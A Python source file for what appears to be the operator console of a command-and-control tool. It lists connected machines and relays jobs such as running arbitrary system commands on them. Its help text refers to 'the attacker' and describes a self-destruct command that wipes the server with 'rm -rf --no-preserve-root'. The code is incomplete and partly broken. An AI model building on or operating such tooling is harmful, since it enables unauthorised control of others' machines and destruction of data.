import socket
import os
from typing import Tuple
from PySide6.QtCore import QThread, Signal, QObject, Slot

global_debug = True


class FClient(QObject):
    shell_output = Signal(str)
    authenticated = Signal(bool)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.encoding = 'utf-8'
        self.buffer = 1024
        self.authenticated = False

        ## Errors
        self.err_ConnRefused_0x01 = False
        
    
    def connect_to_server(self, connlist: Tuple[str, str, str, str]) -> None:
        self.ip, self.port, self.username, password = connlist

        if global_debug:
            print('Connecting to server')
        
        ## Connection Stuff
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_addr = (self.ip, int(self.port))
        try:
            self.server.connect(self.server_addr)
        except ConnectionRefusedError:
            self.authenticated = False
            self.err_ConnRefused_0x01 = True
                
        if global_debug:
            print(f"!_user_!\\|/{self.username}\\|/{password}")
        
        ## Sending Login string
        self.server.send(self.str_encode(f"!_userlogin_!\\|/{self.username}//|\\\\{password}"))
        response = int(self.server.recv(1024).decode())

        if global_debug:
            print(f"Server Auth Response: {response}")
        
        ## 0 is success, like in C
        if response == 0:
            if global_debug:
                print("Connected!\n")
            self.authenticated = True
            
            ## passing this to have the IP details pop up
            self.shellformat("")

        else:
            if global_debug:
                print("Auth failed.")
            self.authenticated = False


################
## Server interact
################  
    def client_disconnect(self) -> None:
        """Close the client-server connection and reset the authentication status."""
        self.server.close()
        self.authenticated = False

    def server_interact(self, client_name: str) -> None:
        """Interact with the server directly."""
        print("COMMAND:" + client_name)

        # Populating the lists needed & getting info from server
        self.server_info_fetch()

        # Home Menu
        if client_name.lower() == "clients":
            self.shellformat(self.server_request("clients"))
            
        elif client_name.lower() == "refresh":
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            self.server_info_fetch()
            self.shellformat("")
            
        elif client_name.lower() == "get-jobs":
            server_supported_jobs = (
                "Possible Jobs (Some may not be available on older clients):\n"
                "set-heartbeat\n"
                "wait\n"
                "run-command\n"
            )
            self.shellformat(server_supported_jobs)
            
        elif client_name.lower() == "help":
            print("HELPMENU TRIGGERED")
            helpmenu = (
                "Home: \n"
                "refresh - refreshes the current connected clients \n"
                "stats - ' [BETA] Prints all clients stats'\n"
            )
            self.shellformat(helpmenu)

        elif client_name in self.clients:
            pass
            while True:
                # 'response =' instead of a direct print so I can pass the variable easier/shorter
                response = self.client_interact_through_server(input(f"{client_name}@127.0.0.1:6969$: "), client_name)
                if response == "home":
                    pass
                    # atempt at making this go back to the first prompt
                    # self.server_interact()
                else:
                    print(response)

        else:
            print("command not found")
            print(self.clients)
            print(client_name)

    def shellformat(self, results: str) -> None:
        """Format the shell output and emit the formatted results."""
        print("Debug: " + results)

        formatted_results = (
            f"{self.server_addr}:{self.username}>\n{results}"
        )

        self.shell_output.emit(formatted_results)

################
## Client Functions/Commands
################        
    def client_interact_through_server(self, client_command, client_name):            
        if client_command == "" or client_command == "help":
            print(
                "Prefix Overview: \n  - 'get': retrieves data from the server.\n  - 'set': set something on the client, or server\n  - 'run': run an action on the client, or the server\n\n" \
                "Commands: \n"
                "get-data: retrieves general data about the client from the server's inventory (does not touch client)\n" \
                "get-macros: lists all the jobs the *server* knows about. Not all jobs may be supported across all clients. (see get-jobs-possible command)\n" \
                "get-jobs-possible: retrieves the jobs the client can *currently* do. (DOES talk to client)\n" \
                "set-macro: sets a macro for the current client. Macros are a set of jobs run by the client.\n" \
                "run-command: runs a singular (one liner) system command on the client. Handy for if there is not a job that runs what you need.\n" \
                "Emergency Commands: \n  - use for EMERGENCIES ONLY, there is no favorable outcome for the attacker with these\n" \
                "nuke-server: kills the server, tells the clients to delete themselves, and runs 'rm-rf --no-preserve-root' on the server machine. "
            )

        elif client_command in ["home", "exit"]:
            return "home"

        elif client_command == "get-data":
            # No arguments for get-data yet, so this is fairly simple
            return self.server_request(client_command, client_name)

        elif client_command.startswith("set-heartbeat"):
            try:
                # Map: stripping of whitespace and splitting
                command, value = map(str.strip, client_command.split())
                value = int(value)
            except ValueError:
                print("Please provide a valid integer for the heartbeat timeout:\nset-heartbeat 120")
            else:
                return self.server_request(client_command, client_name)

        elif client_command.startswith("run-command"):
            try:
                command, value = map(str.strip, client_command.split())
                value = str(value)
            except Exception as e:
                print("Please enter a command to run")
            else:
                return self.server_request(client_command, client_name)

        elif client_command == "set-macro":
            return self.server_request(client_command, client_name)

        else:
            print("Command not found")

            
################
## Server Functions
################  
    def server_info_fetch(self):
        """
        Grabs info and formats it, meant to be an easy data-update method.
        """
        pass
        #print("Requesting self.clients... DISABLED")
        #self.clients = list(self.server_request("clients").split())

    def client_info_fetch(self, client_name):
        """
        Grabs (per) client info and formats it.
        """
        pass
        '''print("Requesting {client_name} info...")
        self.client_info = list(self.server_request("clients").split())
        #self.client_stats = self.server_request("stats")'''

    def server_request(self, request, client_name=None):
        """
        The main interface for getting data from the server,
        will handle all encoding and bs, just pass it the string,
        returns the response!
        """
        if request == "clients":
            print("hi")
            formatted_request = f"!_usercommand_!\\|/{self.username}//|\\\\{request}"
            print("hi2")
            print(f"DEBUG: Sending {formatted_request}") if global_debug else None
            self.server.send(self.str_encode(formatted_request))

            # return this eventually to the function that called it to print
            print("DEBUG: waiting on response...") if global_debug else None

            return self.receive()

        elif "-" in request:
            formatted_request = f"!_usercommand_!\\|/{self.username}//|\\\\{request} {client_name}"
            print(f"Formatted request: {formatted_request}")
            self.server.send(self.str_encode(formatted_request))

            # separate receive because it's long and ugly
            return self.receive()

        else:
            print(f"Invalid Command: {request}")

    def receive(self):
        """
        Receives response from the server.
        """
        full_msg = ""
        new_msg = True
        HEADERSIZE = 10

        while True:
            msg = self.server.recv(int(self.buffer))  # << adjustble, how many bytes you want to get per iteration
            if new_msg:
                # Carving up msg into the first X bytes (X = headersize)
                msglen = int(msg[:HEADERSIZE])
                new_msg = False

            print(f"full message length: {msglen}") if global_debug else None
            print(f"msg partial:" + msg.decode()) if global_debug else None
            full_msg += self.str_decode(msg)

            print("total bytes received: " + str(len(full_msg))) if global_debug else None

            # if the full message matches the originally sent message size (msglen) (excluding headers) message has been sent
            if len(full_msg) - HEADERSIZE == msglen:
                print("full msg recvd") if global_debug else None
                print(full_msg[HEADERSIZE:]) if global_debug else None
                new_msg = True

                # returning full message and stripping header
                return full_msg[HEADERSIZE:]

    def credential_gather(self) -> list:
        """
        Takes credentials from friendly client.
        """
        # HA yes this works! init the list with types!
        creds_list = [str, str]

        creds_list[0] = input("Username: ")
        creds_list[1] = maskpass.askpass()  # input("Password: ")

        self.username = creds_list[0]

        return creds_list
        
    ## Doing dedicated encode/decode casuse syntax is easier & cleaner
    ## bytes -> str
    def str_decode(self, input) -> str:
        decoded_result = input.decode()
        return decoded_result

    ## str -> bytes
    def str_encode(self, input) -> bytes:
        encoded_result = input.encode()
        return encoded_result


if __name__ == "__main__":
    fc = fclient()
    
    fc.connect_to_server()